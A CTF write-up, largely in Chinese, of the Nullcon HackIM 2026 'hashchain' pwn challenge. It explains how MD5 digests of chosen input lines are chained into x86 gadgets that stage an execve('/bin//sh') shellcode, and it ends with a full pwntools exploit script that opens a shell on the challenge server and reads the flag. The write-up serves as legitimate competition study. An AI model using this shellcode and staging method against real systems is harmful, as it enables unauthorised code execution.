---
title: "hashchain - Nullcon Goa HackIM 2026 CTF"
category: "pwn"
subcategory: "shellcode"
type: "writeup"
tags: ["code-exec", "md5", "pwn", "xor", "shellcode", "base64", "nullcon-goa-hackim-2026-ctf", "2026", "ctf-writeup"]
summary: "\\- Local directory: pwn/hashchain/nullcon2026-hashchain"
source:
  name: "CTFtime writeup #40555"
  url: "https://ctftime.org/writeup/40555"
ctf:
  name: "Nullcon Goa HackIM 2026 CTF"
  year: 2026
  challenge: "hashchain"
---

## Metadata

- **CTF:** Nullcon Goa HackIM 2026 CTF
- **Task:** hashchain
- **Author team:** 正规子群.AI
- **CTFtime tags:** code-exec, md5, pwn
- **CTFtime:** <https://ctftime.org/writeup/40555>

---
## 126 hashchain

\- Category: `pwn`  
\- Value: `173`  
\- Solves: `110`  
\- Solved by me: `True`  
\- Local directory: `pwn/hashchain/nullcon2026-hashchain`

### 题目描述  
> They said MD5 was broken. They said it was insecure. But they never said it could run.  
>  
> Author: @gehaxelt

### 连接信息  
\- `52.59.124.14:5010`

### 附件下载地址  
\- `<https://ctf.nullcon.net/files/d12e1c3f88f14158dd49ee3ac12a5dce/hashchain.zip?token=eyJ1c2VyX2lkIjo1MDYyLCJ0ZWFtX2lkIjoyMzEyLCJmaWxlX2lkIjoxMDF9.aYqlPg.gU8s7Stew6ehR2OYGX9OC7JniqM>`

### 内存布局  
\- 暂无可解析二进制 或 本题主要是非二进制方向

### WP  
# nullcon2026-hashchain

\---  
## 题目信息  
\- 类型: Pwn  
\- 目标: `52.59.124.14:5010`  
\- 提示: `They said MD5 was broken. They said it was insecure. But they never said it could run.`  
\- flag 格式: `ENO{...}`

\---  
## 初始行为与执行模型  
连接后交互非常简单：  
1\. 服务输出 `Welcome to HashChain!` 和提示符 `> `。  
2\. 每提交一行，返回 `Hash n stored.`。  
3\. 提交到第 100 行后输出 `Executing 100 hash(es) as code...`，随后不再回到常规 REPL。

通过构造 `MD5(msg)` 前缀为 `eb fe`（短跳死循环）验证到：  
\- 确实在执行 hash 字节而不是原始输入。  
\- 执行单元是 16 字节块（MD5 摘要长度），使用 `.. eb 0c` 可以从当前块跳到下一块首部。

也就是说，我们可控模型是：  
\- 第 $i$ 行输入 $m_i$。  
\- 被执行的块是 $H_i = MD5(m_i)$（16 字节）。  
\- 通过前 4 字节布局指令，后 12 字节作为“雪橇/垃圾区”被跳过。

\---  
## 关键坑点：TTY 行规程导致输入字节失真  
一开始我用二进制消息做前缀搜索，后来发现某些本地可复现的前缀在远端行为异常。

根因是服务前面有 TTY 行规程（canonical/echoctl 等）：  
\- 某些控制字符（例如 `0x11`，XON）会被吞掉或特殊处理。  
\- 导致“本地计算 MD5 的消息字节串”与“服务端实际参与哈希的字节串”不一致。

修正方式：  
\- 搜索消息时仅使用可打印 ASCII 集合（本解法用 base64 字符集），确保服务端接收字节与本地一致。  
\- 之后所有最终使用的 gadget 消息均为 ASCII-safe。

\---  
## 利用思路  
目标是两阶段执行：

1\. **Stage-1（hash 链执行）**  
\- 用 7 个 gadget 先执行 `read(0, esp, 0x4c)`，再 `jmp esp`。  
\- 这样可把第二阶段机器码直接喂到栈上执行。

2\. **Stage-2（栈上 shellcode）**  
\- 使用 32-bit `execve("/bin//sh", 0, 0)` shellcode（无 `0x00/0x0a/0x0d` 字节）。  
\- 拿到 shell 后执行 `cat flag.txt` 输出 flag。

Stage-1 关键 gadget（均为 `MD5(msg)` 前缀）：  
\- `31dbeb0c` -> `xor ebx, ebx`  
\- `89e1eb0c` -> `mov ecx, esp`  
\- `b24ceb0c` -> `mov dl, 0x4c`  
\- `31c0eb0c` -> `xor eax, eax`  
\- `b003eb0c` -> `mov al, 3`  
\- `cd80eb0c` -> `int 0x80`  
\- `ffe4....` -> `jmp esp`

这里的跳转关系是固定的：  
\- 每块前 4 字节用 `... eb 0c`，从块首偏移 2 处跳过 12 字节，落到下一块首部。

\---  
## 内存与执行路径分析Pwn 要点  
\- 服务维护 100 个 MD5 摘要组成的可执行缓冲区，总计约 $100 \times 16 = 1600$ 字节。  
\- 触发点在第 100 次提交后，直接把该缓冲区当代码入口执行。  
\- 我们不依赖返回地址劫持，而是构造“线性 hash-shellcode”。  
\- Stage-1 用系统调用把 Stage-2 注入到栈，再跳栈执行，绕开单块 16 字节可控度不足的问题。

\---  
## 失败路线记录  
1\. 直接尝试单阶段 open/read/write：  
\- 需要较多 gadget，且路径字符串与寄存器控制复杂，调试成本高。  
2\. 早期二进制消息搜索：  
\- 因 TTY 控制字符吞吐导致哈希不一致，出现“本地命中，远端异常”现象。  
3\. `mov al,3` 但未先清 `eax`：  
\- 仅改低字节会保留高字节脏值，`int 0x80` 号不稳定，导致 stager 不可用。  
\- 加入 `xor eax,eax` 后稳定。

\---  
## 复现  
脚本：`solution/[solution.py](http://solution.py)`

运行：  
```bash  
python3 solution/[solution.py](http://solution.py)  
```

脚本默认远端连接 `52.59.124.14:5010`。若你本地有同名二进制 `task/hashchain`，可不加参数跑本地；否则默认走远端。

\---  
## Flag  
```text  
ENO{h4sh_ch41n_jump_t0_v1ct0ry}  
```

### Exploit  
#### pwn/hashchain/nullcon2026-hashchain/solution/[solution.py](http://solution.py)

```python  
#!/usr/bin/env python3  
import os, sys  
# Ensure consistent terminal behavior  
os.environ.update({'PWNLIB_NOTERM': '1', 'TERM': 'linux'})

# KEEP EXACTLY AS IS: prevents namespace conflict with math.log  
from pwn import process, remote, ssh, context, log as pwnlog

context.log_level = 'DEBUG' # Never hide logs initially

import re  
import time

HOST = '52.59.124.14'  
PORT = 5010

# Stage-1: each line is md5(message), executed as code after 100 hashes.  
STAGE1_LINES = [  
b'Q8Akr0BAAXYZ', # 31dbeb0c : xor ebx, ebx  
b'QA0pH1BAAXYZ', # 89e1eb0c : mov ecx, esp  
b'QFWb/DAAAXYZ', # b24ceb0c : mov dl, 0x4c  
b'Qre2DjAAAXYZ', # 31c0eb0c : xor eax, eax  
b'QpNWeuAAAXYZ', # b003eb0c : mov al, 3  
b'QS+7FFAAAXYZ', # cd80eb0c : int 0x80  
b'QOjDAAAAAXYZ', # ffe4.... : jmp esp  
]

# Stage-2: execve("/bin//sh", 0, 0)  
STAGE2 = bytes.fromhex('31c050682f2f7368682f62696e89e3505389e131d2b00bcd80')

def start_io():  
local_bin = 'task/hashchain'  
use_remote = ('REMOTE' in sys.argv[1:])  
if (not use_remote) and os.path.exists(local_bin):  
[pwnlog.info](http://pwnlog.info)(f'local mode: process({local_bin})')  
return process(local_bin)

[pwnlog.info](http://pwnlog.info)(f'remote mode: {HOST}:{PORT}')  
return remote(HOST, PORT)

def recv_some(io, duration=2.0):  
out = b''  
end = time.time() + duration  
while time.time() < end:  
try:  
chunk = io.recv(timeout=0.2)  
if not chunk:  
break  
out += chunk  
except EOFError:  
break  
except Exception:  
pass  
return out

def solve():  
last_err = None  
for attempt in range(1, 4):  
io = None  
try:  
[pwnlog.info](http://pwnlog.info)(f'attempt #{attempt}')  
io = start_io()

# Wait for first prompt.  
io.recvuntil(b'> ')

# Fill 100 hashes: first 7 are crafted, rest are filler.  
lines = STAGE1_LINES + [b'A'] * (100 - len(STAGE1_LINES))  
for idx, line in enumerate(lines, 1):  
io.sendline(line)  
if idx < 100:  
io.recvuntil(b'> ')

io.recvuntil(b'Executing 100 hash(es) as code...\r\n')

# Feed second stage and then run shell commands.  
io.sendline(STAGE2)  
warmup = recv_some(io, duration=1.0)  
for cmd in (b'echo READY', b'cat flag.txt', b'cat /home/ctf/flag.txt', b'exit'):  
io.sendline(cmd)  
time.sleep(0.15)

out = warmup + recv_some(io, duration=4.0)  
[pwnlog.info](http://pwnlog.info)(f'collected {len(out)} bytes after shell command')

m = re.search(rb'ENO\\{[^\r\n}]*\\}', out)  
if m:  
print(m.group(0).decode())  
io.close()  
return

last_err = RuntimeError('flag not found in shell output')  
except Exception as e:  
last_err = e  
pwnlog.warning(f'attempt #{attempt} failed: {e!r}')  
finally:  
if io is not None:  
try:  
io.close()  
except Exception:  
pass

raise RuntimeError(f'all attempts failed, last error: {last_err!r}')

if __name__ == '__main__':  
solve()  
```

\---
